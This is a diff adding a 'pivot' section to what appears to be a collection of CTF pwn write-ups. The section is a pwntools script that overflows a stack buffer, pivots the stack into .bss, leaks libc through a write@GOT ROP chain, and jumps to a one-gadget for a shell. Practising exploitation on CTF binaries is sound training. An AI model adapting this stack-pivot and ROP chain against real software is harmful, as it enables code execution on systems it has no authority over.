@@ -333,6 +333,49 @@ p.interactive()
 
 <br />
 
+## pivot
+
+Stack pivoting
+
+```python
+from pwn import *
+
+context.arch = 'amd64'
+# context.log_level = 'debug'
+e = ELF('./pivot')
+p = process('./pivot')
+libc = e.libc
+leave_ret = 0x000000000040075f # leave ; ret
+prdi = 0x00000000004007d3 # pop rdi ; ret
+prbp = 0x0000000000400620 # pop rbp ; ret
+prsi_r15 = 0x00000000004007d1 # pop rsi ; pop r15 ; ret
+bss = e.bss() + 0x100
+main = 0x000000000040072E
+
+payload = 'A'*0x50
+payload += p64(bss) # sfp
+payload += p64(main) # ret
+p.send(payload)
+
+payload2 = p64(prdi) + p64(1) + p64(prsi_r15) + p64(e.got['write']) + p64(0) + p64(e.plt['write'])
+payload2 += p64(e.symbols['main'])
+payload2 = payload2.ljust(0x50,'A')
+payload2 += p64(bss - 0x50 - 8) # sfp
+payload2 += p64(leave_ret) # ret
+p.send(payload2)
+
+libc_base = u64(p.recvuntil('\x7f')[-6:] + '\x00\x00') - libc.symbols['write']
+log.info('libc_base : ' + hex(libc_base))
+
+payload3 = 'A'*0x58
+payload3 += p64(libc_base + 0x45216)
+p.send(payload3)
+
+p.interactive()
+```
+
+<br />
+
 ## campnote
 
 fastbin
